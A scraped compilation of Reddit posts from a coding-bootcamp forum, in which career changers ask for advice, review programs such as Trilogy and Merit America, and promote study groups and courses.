Week 1- Intro to Python

Week 2- Advanced Python

Week 3-Introduction to Java

Week 4- Advanced Java/JSP

Week 5- Introduction to HTML5/ CSS3

Week 6- Introduction to Javascript &amp; Advanced HTML 5 /CSS3

Week 7- Introduction to MERN

Week 8- Advanced MERN

Week 9&amp; 10 Advanced Capstone Project

&amp;#x200B;

My personal connections in this field do not exist. I have no relationships to leverage that would get my foot in the door, and I don't really know if it makes sense for anyone to hire me after I complete this boot camp. I have carefully read about trying to reskill via boot camps, and I am aware that there are a few lines of thought about this:

""Boot Camps are a Waste of Time."" This does not seem to be true, entirely, but there are stories, often untold, of other people in coding boot camps that are unable to obtain employment after graduation. If this were me, and I spent $10,000 on a boot camp, I probably would not go onto Reddit and brag about it

&amp;#x200B;

""Boot camps are a great way for people with STEM degrees to change careers."" My undergraduate degree does not have any of the word that make up the acronym STEM in it. Does it make sense for someone with a liberal arts degree to try to market themselves as a junior developer in waiting after attending a ten week boot camp? Would YOU hire me?  


""Boot camps do not get you experience, they just show you the ropes."" How does someone with no experience that is marketable get one's foot in the door? And, with the course outline above, what are the odds of finding work if I don't have SQL but instead have mongo? 

&amp;#x200B;

I feel like I can do the work and learn some basic skills, but my ability to market myself locally-I have a wife and 3 kids, I'm not moving anywhere-is going to be the shortcoming in my misadventure.  


Like I said, the program is fully funded, but I feel like the idea of ""I can afford this!"" is easily confused with ""this is going to work!""",Full Stack Boot Camp-New Horizons?,"I'm looking for any and all feedback about my fantastical journey into a junior development role.

codingbootcamp,"Have been considering making the leap for the last couple of years and wanted some input on potential positions/roles I could go for with my existing experience + bootcamp.

Some background: late 20s, currently working at mid-tier bank doing BSA/AML compliance and controls testing. 6 years of relative experience in that field with 130k salary. I just don’t think I’m made for the typical old-fashion finance industry and have been trying to move into crypto/fintech but it’s been difficult.

coding/developing always intrigued me, I think theres similarities in what my work currently requires me to do, and what I would need in order to be good in the industry. I’m also worried about future proofing my career and feel like tech is the safest bet.

I understand that I’ll probably take a paycut in the beginning but hoping I’ll catch up quickly in terms of growth and opportunity.

I still have student loans and have to be financially independent so will definitely be taking a part-time bootcamp (please lmk if you have recs)

I guess my questions are: whether it’s really worth to make the jump right now, are there any types of roles where my previous experiences can help add to being a developer rather than just becoming a waste and if I should even bother doing a bootcamp if I can only do it part-time?

codingbootcamp,"Hi all, this is my first reddit post, so bare with me.

I quit my job last month (veterinary medicine, laboratory, no formal degree) and I am relying on the support of my partner until I figure out what I am going to do. I have been doing Codecademy courses  as well as Mimo and some YouTube practice until I land on a decision about which bootcamp to attend. Is there a well documented spreadsheet that someone has created going over different bootcamps with tuition, length, pros/cons, virtual vs in-person, etc? I am having a hard time with all the options.

I am relying on the support of my partner so money is tight. We have a preschool aged kid who will be in school full time starting late August, so I am banking on doing a bootcamp during the time the kid is in school. I am interested in Ada Design Academy but between all the wait times from admission to starting, I wouldn't even be able to start that program until March of next year. Can't really do that. I am also looking at Launch and Thinkful. 

Anyway, interested in the comparative spreadsheet if anyone has any leads, and any recommendations y'all might have in addition!

codingbootcamp,"Hi everyone,

I personally am attending App Academy on Monday because I want an in person experience and rather not wait till the end of October to start. But I have been accepted into AA, Codesmith, and Hack Reactor and want to share insights from a non codesmith truther.

To start: CSX fucking sucks: if your brand new to programming, because it is challenging, but does not provide a strong enough base, and their solution videos suck if you don’t have a strong base to go on. Personally I believe CSX is designed this way to sell their CS/JSB beginner programs because you don’t learn anything from going through CSX. 

How do you prepare for CSX. 

1. Eloquent JS chapters 1-14. Read and take notes. 
2. Freecodecamp OOP and basic JS found in their JS curriculum 
3. Freecodecamp YouTube on:
-recursion 
-dynamic programming
-higher order functions 


If you put effort into the recourses I listed above you will hit less road blocks and be able to work through the sections actually understanding what’s going on.

codingbootcamp,"Howdy,

I used to run a coding boot camp that focused on Blockchain.  I called it MerkleSchool ( the google ranking is still up ).  This was back in 2018.  I'm a Sr. Dev from big tech, and I ran the school solo out of a coworking space.  I've seen some of the threads and questions here, and I have some advice for those wishing to use a code bootcamp, online resources, and other ideas on how to learn to code.  I also have a help request, and figured this post would make a fun give-and-take.

The give:

Learning to code is hard for some people, and not hard for others.  The big difference is how much you know about computers prior to learning to code.  And by that, I mean at different layers of abstraction.  The first is the idea of memory partitions.  This idea is used everyplace as a proxy for other ideas around distributed processing.  Let's pretend you're going to do a full stack web app -- say you're going to copy amazon.com.  Well, that's not complicated, but it's very complicated at the same time.  If you understand that a real service like AMZN has a front-end, a middle layer, and a back-end all running on different physical infrastructure; that you are *simulating that environment* locally via memory/process partitions and that the information in memory is different at each layer, and you're sending messages between different memory partitions -- it'll be easier to learn how to code.  This is especially important if you're doing full stack in a single language like NodeJS.  In fact, I don't recommend doing full stack in a single language, because the memory partition as proxy for infrastructure division problem gets really bad for some learners.


Another thing that I've seen is troubleshooting your computer via a command shell.  One thing I have seen a lot, and this includes in new college hires with CS degrees, is that they don't understand how things like loading a process works.  This is fine -- until something goes wrong and you're trying to do an assignment, and fighting your computer at the same time.  For this reason, I don't recommend a coding bootcamp to anyone who can't boot a linux computer and install an app via bash.  Figure out how to setup something complex -- say Jupyter notebooks and tensorflow in a virtual system of some sort from scratch ( either a VM or a container ).  Just do hello world -- the code's already written for you -- it's the act of learning how to install stuff and use a command shell that's the important exercise.


There are some other items that are important.  Programming is a ""High-G"" sport.  That is to say, there really is a minimum IQ, working memory, frustration management, and inherent curiosity requirement to learn it. I'd wager that only 35% of the population has the capability to learn it.  It's got nothing to do with school performance, and a lot to do with abstraction/memorization capability.  And, in fact, it's probably closer to language skill/vocabulary acquisition capability than math.  If you're the kind of person that could learn a foreign language like French or Japanese, then you likely have the required ""G"".  Being good at algebra is a poor predictor -- it's more like learning to talk to the computer and being able to model the ""mind"" of the computer.  Math has simply been the ""G Proxy"" commonly used in academia, even when it doesn't make sense.


Programming requires experimentation to learn.  Lots of trial and error, with lots of failure.  So much failure.  I've seen students have very minor failures -- failures that wouldn't frustrate me in the slightest and I view as normal -- give up because of the small failures.  If you can't manage the emotion of frustration from trying again and again -- programming is not a good fit for your personality.  The difference between a good programmer and a bad one is emotional -- the good one handles frustration well and does trial/error even though they're beating their head against a wall.  The good ones eventually learn to celebrate the little victory when they figure something out -- no matter how trivial.  I spent all of yesterday installing a single library.  A single library.  Every installation failed at run-time in weird ways because of conflicts with other libraries.  I eventually got it installed and running, and you bet that was something I celebrated.


Google is a skill.  Programming is a lot of frustration because a lot of the information is wrong or outdated.  It's why I like Go so much -- that backward compatibility guarantee means documentation and examples will work even 2 years later.  It's why I hate NodeJS -- because library functions move around, sometimes between packages -- for no apparent reason, and documentation is always out of date.  Being able to use Google well -- to find solutions to the constant stream of failures -- is critical.

Between a boot camp and online learning - the boot camp wins hands down.  The Pandemic happened, and the research is now conclusive -- for almost all people, online is a worse learning environment -- even online, live, and instructor lead.  There are just too many friction points that will cause you, the student, to use working memory (which is very finite in a human) or frustration management (again, finite resource) online vs in person.  Your best bet to actually learn in a reasonable time is in an in-person, instructor-paced setting.  The real problem is that programming is just not a profession that's a good fit for the majority of people.  The fact that you think it's a good fit for you (or you wouldn't be thinking about a boot camp) is a good indicator that it is actually a good fit for you.  But, you won't know if you can handle the frustration until you try.


The take:

Now, my ask.  I find I like looking for solutions with other programmers.  At work, we often ""coach each other"" through problems.  It'd be nice to be able to do that at home, not just at work, when I screw around learning to program something new.  A ""matchmaking"" service where I could hop in, send a ""I'm working on X, who wants to join me"" request, then match with another programmer with the same interest so we could pair program for an hour or two here or there.  Does anyone know of such a service (one that isn't a scam)?",I used to run a coding boot camp. Some advice and a help request,"Howdy,

Anyways, does anyone have experience directly with The Tech Academy and finding a job quickly after? So far I’m actually ahead of graduation date (self paced course), and the reviews for The Tech Academy seem really good!

codingbootcamp,"Hello all, I'm currently enrolled in the UNC Charlotte Bootcamp and we are over half way done with everything. We just finished our 2nd big project and feel like I'm way behind everybody else. My grades aren't the worst but could definitely be better, but this group project really brought this to my attention. tl;dr at the bottom.  


My other (5 total) group members basically carried all of the work.

A good example of this is that while 2 of us were working on one part of the project, a single group member did all of the CSS work on his own. I mean ALL of it, and he just suddenly did a git push request and showed about 700+ lines of code.

codingbootcamp,"Around 9 months ago, I walked out on my job that I had loved and worked at for almost 3 years. It was in the restaurant industry. The hours were long and the job sometimes really demanding, but I did enjoy it. Unfortunately, the work environment changed drastically at a certain point, prompting me to make my leave. I had NO IDEA what I was going to do next, but I remember my friend mentioning a buddy of his took some bootcamp thing and ended up with a well-paying job as a SWE. 

So I looked into it, and before long, was on the phone with a representative from 2U (the bootcamp was through the University of New Hampshire). Sidenote: it seems like a lot of shade gets thrown on 2U for using a university name. I don't understand this. It is made abundantly clear when you enroll that there is a separate entity running the bootcamp and that you're not actually getting an instructor from the university. However, it's important to note that these details are largely irrelevant when it comes to the quality of the course as that has more to do with the material being taught. I would argue the material is the same just about everywhere (including free online sources).

I started my coding journey two months before my first class. I used [freecodecamp.org](https://freecodecamp.org) (and you should, too) to get a really good head start. I had coded my own Blackjack browser game by the first day. In other words, I prepared (perhaps a bit overkill) for the class and didn't expect it to be a cake walk. Well, being that I already knew some JavaScript, the fact that Week 1 was just HTML put me in a good spot. For the majority of the class, I actually kept this pattern up. During most of the course, I was about 2-3 weeks ahead of the class. The only reason I was able to do this was because of that head start with [freecodecamp.org](https://freecodecamp.org). I think this is integral to expediting the process of breaking into a new career. Show up on the first day with some knowledge you found on your own and you'll be in great shape. This is a good segue into my next point:

The admissions counselor told me it was 10 hours class time per week, plus 10-20 hours of time outside of class. I guarantee that if you follow this pattern, you will be just fine. The problem is, most people don't, and you can't blame them. For people with families, full-time jobs, and various other commitments, the idea of spending another 20-30 hours a week doing something else is unreasonable, and at times, impossible. This doesn't mean that you'll fail without investing all this time, but you'll have a very difficult time if you don't spend a lot of your days learning to code. I've seen some complaints about how the course ""leaves a lot of gaps for you to fill in"". The idea is the gaps get filled in during your independent time (10-20 hours per week). You need to be self-sufficient at times. They also offer tutoring and my instructors were often available for questions in Slack any day of the week. And to my next point:

You need to enjoy it. At least at some level. You need to get some satisfaction out of solving problems or making visuals with code or making tight data models or designing clean REST APIs or whatever it is that makes you feel less dead inside. Chances are there is something in software that you slot perfectly into, but rarely is anyone going to tell you what that is. That's something you need to find and work at for yourself.  


That being said, the Career Services offered by the bootcamp are amazing. I'm not sure every bootcamp has this as an option, but I was given the opportunity to speak with professionals about what recruiters are looking for and how to craft my resume/online brand in such a way that appealed to them. In addition to this, I was assigned a personal Career Director who met with me weekly to discuss where I was at with the job search. She actually was the one who told me to apply to the job I have today. This is a service you can pay for elsewhere, but it was really nice to have it embedded into the program. I also felt like they genuinely wanted me to succeed (of course that's their job but still nice).  


In conclusion, I've noticed a lot of criticism surrounding bootcamps so I wanted to share my experience in the hopes that it would help others who have already invested or are thinking about investing in a new career. You will most likely NOT get a SWE career just by showing up to class, turning in assignments on time, and paying tuition. But if you take the time to apply the things you learn in class, build projects of your own, or read documentation just because you're curious, you'll have the makings of a great developer.  


TLDR;  
You can become a developer (and even get employed) after a 24-week long bootcamp. However, much of your progress is dependent on your consistency and, just as importantly, your interest with the material.

  I am recently looking in on learning how to code to help advance my skillset for future careers. I am looking for resources that teach people how to code that are free and are of good quality. Specifically, I want to (at least start out learning, but if there are other languages that have good resources feel free to let me and other readers know) learn python, all of the C's (C,C+,C++,C#, etc.) and possibly even javascript. Pretty much anything that could help me develop software or apps. I am specifically looking at making software with applied math skills I would be picking up with my physics degree (as I have been asked on what languages I need to use to make things but I have honestly no clue as I am that much of a beginner).

codingbootcamp,"
So I finished my MS in accounting and finance back in 2015 and chose to play professional poker for a living for the past 7 years. I did it for the comfort and freedom but I think I can’t do it for much longer. It’s been an exhausting ride and I want to make the transition to a real world job for more stable income and a healthy 401k when I retire.

Some friends suggested I look at this thing called “data science” and “coding” and finish some online courses/get a certificate of some kind or maybe even do some bootcamp to get started. 

I have a few questions:

1) Is it worth the time/effort to pursue this? I don’t want to end up spending time trying to learn this only to be turned down at interviews later because I have such a gap on my resume. What are the hiring prospects for someone like me?

2) How do I even figure out if I would enjoy this career? I know nothing about it. I only studied computer science for 2 years (remember learning C++) in my undergrad but remember nothing. Know no other languages.

3) Are there any alternative careers you guys would recommend instead if not data science?

My biggest concern is how easy/hard it’ll be to find a job once I get a certificate or something. 

Any input is highly appreciated, thanks guys!",Professional poker player with a Masters in Accounting/Finance and zero work experience in 7 years wanting to get into the 9 to 5 world. Data science an option?,"

The job is fully remote, teaching our veteran students full-stack Javascript M-F. 90 day contract to full-time hire, pay negotiable and competitive, start date ASAP.

Our mission is straightforward. Making veteran's transitions into civilian life as easy as possible through outstanding material and instruction. It's a mission that came about through my own struggle with transitioning out of a 10 year US Army career into software engineering. My goal is to prevent as many people as possible from falling into the same holes I did.

Your responsibilities would include \~4 hours a day live instruction, curriculum design and creation, success coaching, handling student issues as they arise, student pre-screenings, and being comfortable wearing many hats. We're a funded startup and moving fast so flexibility is desired. That doesn't mean I'm expecting absurd hours, however. Instructing is hard and burnout is something I'm acutely aware of and actively warding against.

codingbootcamp,"Hello! So I passed my Hack Reactor TAA, and and waiting until late July for them to provide me with the precourse material. I had previously completed Odin Project Foundations. In the time until I get my precourse material, I’ve gotten back into Odin Project, and the modules are covering intermediate HTML and CSS. 

I want to continue learning more about JavaScript, and am wondering if I’m doing myself a disservice by skipping over the html/css stuff and diving back into Js? 

I know Hack Reactor is JavaScript heavy, and I’m sure that their precourse material will cover what I need to know about html/css.

Anyone have any thoughts on the pros/cons of focusing on JavaScript to prepare, rather than html/css?

I know they are two of the more popular languages, so even though I’d only have experience in two , it’d be a good two to know? (And of course I’d put in work during/afterwords to try and learn as many others as I could.)

If any kids are interested, I'm teaching an intro to coding class this summer beginning July 8th. I'll be teaching the basics of Java and making sure to go slow and understand all the concepts in a clear and concise way with visual help. Learning coding isn't about memorization, but practice so I will be assigning HW every week. 

I'm doing this for free because I also had a private teacher and he has had such a huge impact on my life. I'll be having classes on zoom for 2 hours every week, along with 2-4 hours of homework.

My qualifications: I've been coding on and off since 7th grade, but have really stuck to it and been coding for about 2 years now. I've done USACO, a robotics and computer vision project, built a game of chess, chatbot for real estate agents and currently have an internship at a Medtech startup.

codingbootcamp,"I graduated from the program in May from Data Analytics.
 
I feel lied to on a massive scale. 

The professional development was a joke. 

The technical skills help non existance. 
And their course is LITERALLY Coursera’s Google Data Analytics Cert, which you can access free through the American Dream project and be financially better off. 

And they literally only have like ONE company partner, who is barely hiring (despite their great need). 

They haven’t done JACK SHIT in helping find me a job, and we have to do it all ourselves!

All I have gotten out of the program was STRESS on assignments not even related to analytics &amp; tech. 

Not to mention being repeatedly being  called a sexist (which I am not, as I was born a female and lived as one for more than half my life) for asking legit questions my autistic mind can’t wrap it brain around (and never did, for any gender). So instead of explain the reason/s (like I requested), I get called a derogatory term by a member (repeatedly), and silenced by the program. (This was literally a question about the purpose of selfies)

They talk about not posting anything we wouldn’t want our employers to see... but HAVE THEY BEEN ON LINKEDIN the past few months?!? The stuff I have read is unprofessional to huge poportions. 

If an employer is turned off by something they read on my LinkedIn, then I don’t want to work for them. I post based on my morals and values. I will not be comprimising them anymore for the sake of others, nor pretending to be someone I am not. (Which I had to do in the program, a lot)

They make you sign up for like 5 job platforms with lead to an absorbent amount of spam calls that I had to take my information completely off of them!

I also feel like that fact that so many alumni have returned to MA is actually a bad sign. Makes me think they couldn’t hack it in the tech world, and have to fall bad on duping new learners. 

My mock-interview (there was 1) was an utter joke. They are conducted by volunteers who often have NO recruiting or hiring experience so IMO their feedback is pointless. My person was from India (google) and went straight to a SQL question and wanted us to write the query IN THE ZOOM CHAT after poorly explaining what the database even consisted of. 

I have even asked for the data on how MA actually helped learners to get jobs to analyze myself because I feel like they are stretching the truth and was denied.

I actually want to know how many from the first data analytics (I am the 2nd) cohorot have jobs now bc of them. 

I wish their was a way to sue to break the contract for not-fulling their duties, but it would end up costing more # than the program.",Stay away from Merit America,"I graduated from the program in May from Data Analytics.
 
I feel lied to on a massive scale. 

The professional development was a joke. 

The technical skills help non existance. 
And their course is LITERALLY Coursera’s Google Data Analytics Cert, which you can access free through the American Dream project and be financially better off. 

And they literally only have like ONE company partner, who is barely hiring (despite their great need). 

They haven’t done JACK SHIT in helping find me a job, and we have to do it all ourselves!

All I have gotten out of the program was STRESS on assignments not even related to analytics &amp; tech. 

Not to mention being repeatedly being  called a sexist (which I am not, as I was born a female and lived as one for more than half my life) for asking legit questions my autistic mind can’t wrap it brain around (and never did, for any gender). So instead of explain the reason/s (like I requested), I get called a derogatory term by a member (repeatedly), and silenced by the program. (This was literally a question about the purpose of selfies)

They talk about not posting anything we wouldn’t want our employers to see... but HAVE THEY BEEN ON LINKEDIN the past few months?!? The stuff I have read is unprofessional to huge poportions. 

If an employer is turned off by something they read on my LinkedIn, then I don’t want to work for them. I post based on my morals and values. I will not be comprimising them anymore for the sake of others, nor pretending to be someone I am not. (Which I had to do in the program, a lot)

codingbootcamp,"Hello! Just like the title says: I’m 22 years old and a recent college graduate in chemical engineering. 

I always knew I wanted to be an engineer because of the problem solving required and my love towards math. Chemical engineering was always a tough major for me since the start. I always liked the concepts behind chemical engineering but felt like my passion wasn’t there. Instead, I always found myself diving into cryptocurrency and other tech stuff. 

I always wanted to switch into CS, but my UC university did not allow major change. Now that I have graduated I find myself lost. I do not want to continue a career that I feel I am not passionate about. 

My little brother is a CS student at Berkeley and has recommended that I do a full time coding Boot Camp this summer. I have been doing my research and have come to a conclusion that I want to do this. 

I want to do a full time Boot Camp and do not mind taking out loans for this. My questions now are: 

1) Does it look bad from an employers perspective that I am trying to switch from chemical engineering to software engineer? 

2) Do I have an advantage that I am an engineer graduate when applying to jobs after my Boot Camp? 

3) Which full-time Boot Camp is best for me with my previous experience as a chemical engineer graduate? 

4) Which of these boot camps are still available for me to start? I know that some have unfortunately already started. And I know that Code Academy seems to be the one everyone talks about. Should I pursue Code Academy?

Setting aside 8:30 -1pm on Saturdays and 7-2pm CT on Sundays to build interesting projects with other people. We can start off by deliberating what we will be building, vote and decide before the weekend. We would then kick off the build session by:

2. grouping up depending on what we want to focus on and building in small groups, ideally pairs.

* require the user to signup using Gmail
* answer a list of multiple choice questions indicating the type of company culture they would thrive in
* based on these answers receive a list of companies most closely matched to their answers
* when a user clicks on a company they would be able to ideally see what the interview process for that company typically looks like

codingbootcamp,"I’m sure than many of you are tired of hearing about how terrible Trilogy is but I just wanted to post my experience with them so that I could warn others.

When applying for a bootcamp I applied through a reputable university not knowing that it was through Trilogy, I talked to a recruiter and was emailed an assessment, the questions were not tech related and scary easy. The following day I got a call from the recruiter and she emailed me everything I needed to sign up. In the email I noticed that instead of the University’s name it started saying Trilogy and got weirded out by it, I researched Trilogy and got mixed reviews, the main thing being that you get out what you put it. I wasn’t sure if I liked this bait and switch but of the coding boot camps I had researched this had the best hours to work around my work schedule so I decided to bite the bullet and apply.

I had previous knowledge of HTML and CSS so the first few weeks were a breeze and I was able to knock out the weekly challenges in under 30 minutes and scored 100s on the first few weeks assignments. I didn’t much of it as I had previous knowledge and we had to basically hit check boxes to finish the assignments. Once we started getting into JavaScript I noticed that my grades dropped slightly but not anything bad, I was getting 90+ on everything with feedback that praised my professional looking code and only had minor mistakes that were pointed out as to why I scored a few points under.

This trend continues through class, I scored very well despite feeling like I was struggling but my code worked at the end of the week and the praise kept coming so I was happy with it. Finally we got to the end of class, the final assignment and everything fell apart, my group hardly helped at all, we had zero communication, one person basically said they can’t pass so they were out . I worked my ass off and despite it having a working project to present when I turned in what I did I scored rather high with a note saying good effort on my part. I thought maybe they say my GitHub submissions and felt bad for me.

I’ve been out of the bootcamp for a month now and keep getting rejected while looking for jobs, I’ve shown a few people my code and I’ve come to discover that it is messy, unorganized, and barely functional, I’m basically starting from scratch now because I wasn’t doing as much well I was led to believe and it’s hurting me.

“You get out what you put in” doesn’t mean anything when you’re constantly being told that your code is professional and clean when it’s a hot mess.

codingbootcamp,"Most new developers are just excited. They want to get in there and start making stuff. They'll use whatever gets suggested. Whatever has the lowest barrier of entry. There are a bunch of text editors. I used to use TextEdit, BBEdit, Coda, Sublime, Atom, Vim, and I've tried most of the others too.

Atom came out and was built with HTML, CSS, and JavaScript - which was cool because you didn't have to know python or C or whatever custom stuff Sublime is built with. It was slower in some ways, but opened up the ecosystem to more people and there was innovation.

When VSCode came on the scene, it was free. It was basically *Atom.* But Microsoft had bought GitHub which ran Atom. I don't know the details. But whatever - - - VSCode got popular. It has a fresh look (which is really what most Jr devs care about most) - and it also had a bunch of cool plugins.

Bootcamps seem to use VSCode because it has some live server capabilities and they can get students up and running with linting and a live server and autocompletion and live shared work space - without the student having to really know what a *server* is. We can debate if that's a good way to teach - but you can see why it's so tempting. It's ""FREE!"" Does Microsoft track you? What's in that user agreement? And if you haven't tried out Github Copilot - well, you can pretty much just type pseudo code and it'll spit out a whole express rest API for you based on the code it catalogs from users and all of the open source projects. It's pretty cool. But - it's also pretty strange. If you can learn to *think* like a programmer - then you probably wont have to actually write that much *code* in the coming years. That could open up time for more *thinking* and more design - and less actual code-monkey stuff. 

But with Microsoft owning *most of the computers via their OS usage*, all of the data, Github and all of the code, NPM, VSCode, typescript, and also - LinkedIn... it sure is an interesting move to offer a ""Free"" text editor. Everyone who's new will choose it. They didn't buy Sublime Text like I did 10 years ago. Why would they pay for a text editor if they don't have to? They aren't going to read the fine print. 

[https://www.youtube.com/watch?v=mjY5qND8c7U](https://www.youtube.com/watch?v=mjY5qND8c7U)

I just ran across this video \^ and thought it explained it well.

It's not just the text editor either. If Figma is ""free"" then why would you pay for Sketch? If Discord is free, why would you pay for Slack? Why would you pay for anything - that you didn't have to? And are you *paying* for it - in the long term - via data or the exploitation of your open-source work?

What does it mean to be a person who chooses VSCode over another paid TextEditor? What will it be like when you create your masterpiece and then a huge corporation offers a *better* version for ""free?"" Because no one can stop that from happening - except you. And the weird part is... the only way to stop them - is to pay for things from smaller companies and to learn how to design and build new companies and products instead of going to work for FAANG. When I set out to build my design/dev school, I set out to train designers. Writing code is great, but it can be normalized. It can be controlled.

What is it really costing you - to avoid *paying* for Sublime Text? What is it costing our economy and how will it change the landscape our children will live in?

Have you ever wanted to learn about accessibility and how to bake it into your design process? There are a lot of good books like [Inclusive Design Patterns](https://shop.smashingmagazine.com/products/inclusive-design-patterns) *by Heydon Pickering*. In that spirit, we've started a series where we'll be showing you the whole story of our ""*redesign*."" (websites really just grow and evolve)

You can follow it on YouTube here: [https://www.youtube.com/watch?v=FQQPcc7Ewk0&amp;list=PLeG2tdXPezVDaD-45t-oJap6ZRUfKKKYm](https://www.youtube.com/watch?v=FQQPcc7Ewk0&amp;list=PLeG2tdXPezVDaD-45t-oJap6ZRUfKKKYm)

We'll be talking about all the things we teach in our course and will be talking with *real-life users*. *That's right*: Real humans who use the site with various assistive technologies.

PE is a *BootCamp-style* school in the way that it is focused and condensed, but we're a lot different. We teach a lot more than MERN CRUD/REST implementation. And so, if you're interested in the actual **design** process: *research, content strategy, information architecture, user experience, user interface, user testing, HTTP, HTML, accessibility, CSS, SVG, visual design, PHP, Git, databases, CMS, JavaScript, build tools, animation, performance.. and on and on... some Vue? some Svelte?*

We only do a few sessions a year and we've got room for our [June 27th group](https://perpetualeducation.substack.com/p/last-call-for-june-2022-session). We're always happy to chat about the industry and help you figure out what path will suit your unique goals.

Second question: Which are the best resources to help me prepare for a coding bootcamp?

Are there (preferably free) prep resources that are as good as Codesmith's Javascript for beginners and CS Prep that I can find elsewhere? They don't have to be live classes either.

I found very early on that when I pair program with someone else to solve Leetcode challenges; I spend more time on Leetcode than I would have done alone, as a consequence getting more practice, I am forced to regularly communicate my logic which is useful in an interview, I learn new ways to solve problems in a far more practical and active way than watching a video and I explain things I understand to someone else, which cements my understanding of both the relevant algorithm and just coding in general.

This personal experience inspired my desire to build a pair programming platform where users of similar ability would get matched, receive a programming challenge, get access to a code editor and collaboratively solve the problem over an audio chat. I've actually gone as far as building out a lot of these core features and getting close to deploying an MVP.  Here's a [short video](https://www.loom.com/share/58324cf7b0044e0a9db72240511ad602) walkthrough of parts of it

Interested to start building a community around this, right now you wouldn't have full access to the platform, we would just pair program via Slack huddles/Zoom calls on a regular basis, both helping you both improve your interviewing skills and give you a first hand experience of what I am building.

If anyone's keen please let me know and I'll send you a link to join my Slack channel.

codingbootcamp,"I'm looking for a strictly WordPress or at the very least a WordPress-centric boot camp to help fill in the blanks of my current WordPress knowledge.  I'm no stranger to WordPress, I've worked in close proximity to it for a few years and have even participated in several third party backend integrations for it, but that was all mostly just PHP and very little of the WordPress API.  There's still a lot I could learn though, specifically with regard to the front end development aspect of it, site structure, custom theme and plugin development, WordPress API etc.  The kind of program that would teach me how to build a fully functional WordPress website from the ground up is the kind of thing I'm looking for.  Something project based would be best for me I think.

I've done some research, and most of the Google results for ""WordPress development boot camp"", result in the typical ""Full stack development"" boot camps, most of which have nothing to do with WordPress to begin with.  I did find one however, WPCodeCamp, and while there are some sites like Career Karma, Course Report, and Switchup that do list WPCodeCamp as a thing, none of them have any reviews posted to help verify the validity of the course.  Even their own website fails to provide any examples of student testimonials.  

Has anyone out there had any experience with WPCodeCamp?  IS it any good?  Otherwise, does anyone know of any decent WordPress specific or WordPress-centric boot camps out there that are worth the money (*and preferably under 7k USD*)?

codingbootcamp,"Hi,

Here's my current skills:

Done:

1 Mathematics B.S. degree with some MATLAB and LaTeX exposure (LaTeK?)

1 year of integration testing in Groovy

8 months of Python 2.7 ETL scripting

2 months of learning CSS/JavaScript/JQuery/HTML5 (so very basic skills)

2 months of Power Shell for a personal project of mine, which is kinda like .NET exposure I guess

2 semesters of ANSI C in academia

1 semester of C++ in academia

In my last job, I also did have exposure to Docker, Kubernetes, AWS SQS, Azure equivalent of SQS, whatever that is, AWS S3 bucket stuff, Azure blobbey stuff, Java, Spring Boot, REST API stuff, ROS/Catkin, QGiS, Pointclouds, Terraform, Apache Airflow DAG stuff, CI/CD in Jenkins + Gitlab I guess

&amp;#x200B;

Here's what I have for topics in my personal ""bootcamp"": 

Scrum Mastery but really just Amateury (4 lessons so I can be self efficient in my bootcamp)

C, C++, Python and Java (a total of 12 lessons across these four languages)

Integration and Unit tests, Blackbox, Whitebox (a total of 6 lessons across all these, I don't know what the latter two are so... probably be covering that in there)

Making REST APIs and using them (2 lessons)

Making Spring boot and using them (2 lessons, honestly might be related to the above one but shrugs)

Interacting with AWS, Azure, and Google Cloud in a number of different manners (a total of 6 lessons across all these, with less emphasis on Google Cloud than the other two)

Docker, Kubernetes, Terraform (a total of six lessons across these, I don't really know how they're actually related to each other so that's probably what I'd be covering in there)

Learning how to actually talk professionally on reddit (1 lesson, after I have actually started to take this bootcamp more seriously after writing this ridiculously weird post)

&amp;#x200B;

I need to add some:

\-small assignments

\-large assignments

\-a capstone project? what the hell could that be?

&amp;#x200B;

One idea I had was I would take some of the old stuff I did 11 years ago during university in those two semesters I did C work and add something to it to make it into a large assignment, like convert them all to C++, Java, Python etc.  If that doesn't sound too dumb.

codingbootcamp,"I’ve been self teaching myself JavaScript for the past couple months to try to get into either Codesmith or HackReactor. For reference, I’m a complete newbie to coding. I was a bit more interested in Codesmith over the past month, and have been going through their CSX program and workshops. I find that the further I get into the CSX prep work, the difficulty level increases significantly to the point where I get to challenges that I don’t even know where or how to start. I feel like the recordings and workshop problems are a lot simpler in comparison to the problems on CSX. It worries me if I’d ever be able to keep up with Codesmith’s bootcamp even if I did get accepted.

codingbootcamp,"I've been accepted to three online bootcamps: Full stack Academy, App Academy, and Hack Reactor (12 week program). I need to decide which one I will attend soon. Full stack has the best schedule for me to maintain some life balance, but also because I have a tbi which makes long days of learning challenging. However, Hack Reactor seems to have better career outcomes. I've also read some things that make me worry that the quality of Full stack has gone down recently. Finally, since I've done so much work to learn JavaScript to take and pass the technical interviews for Full stack and Hack Reactor, I'm hesitant to proceed with App Academy which would start from the basics.

Any thoughts about the career services/outcomes of these three bootcamps? Any advice regarding which one I should attend or should avoid?

Consultant usually can make around 60-80k maybe more depending on area.

Only problem don’t know where are some good sources since there are countless YouTube videos and websites. So if I could get a couple suggestions to learn whether free or pay.Wanting to learn to code.

I do not have any other college experience or degrees for background so I thought that the degree would overall look better on my resume. I do not want to go for a CS degree because it is just too heavily math based for me unfortunately. Do employers take software dev degrees seriously? And will this degree get me job ready? I am also scared that if i go for the degree I would still need to go to a bootcamp afterwards to get into specifics and that is just more time and $$ that i do not want to spend.

I liked a few things I did, but nothing seemed to have the pull for me, until I started coding on the side for fun.

We were really hustling and learning a lot every minute.

I have now reached a point where I am confident enough in myself to say that this is what I wanna be doing for the rest of my life - Build products and solve problems using Tech.


My learnings: The roadmap and journey into coding is one you can take alone, but having a great bunch of people around you, who share the same passion as you, makes the entire experience all the more rewarding and fun.

codingbootcamp,"  I am a vet with an IT management background from the military. I had a social science background from college which was a great experience but I had no desire for a c. Due to VA benefits, all tuition is covered which eliminates a lot of risk but only the three bootcamps discussed accept VA benefits. I've done some research on my own and will list pros and cons. Hope to get some feedback. 

1) **GA:** https://generalassemb.ly/education/software-engineering-immersive/new-york-city

Pros: Nationwide with a few overseas locations so brand recognition. It is the only school to offer in-person classes which is a big plus. and suits my learning style Because it is in-person, I get an in-person housing allowance, around 3k/month, which is more than enough (with roommates) and I'll be covered for living expenses. Class size is capped at 20.

Neutral: 16k cost which seems about normal. Three months long with about 2 weeks of pre-foundation. 60-80 hours a week which is no surprise. GA offers many courses in tech field so not sure how I feel about that.

Neg: Uses GI bill so the VA pays them all tuition upfront. Their curriculum seems messy. Starts with Fullstack curriculum with Javascript but spends time on Python and Ruby. Admissions is almost too easy. Aptitude test is like a SAT math exam. 

2) **Fullstacks** https://www.fullstackacademy.com/programs/coding-bootcamp

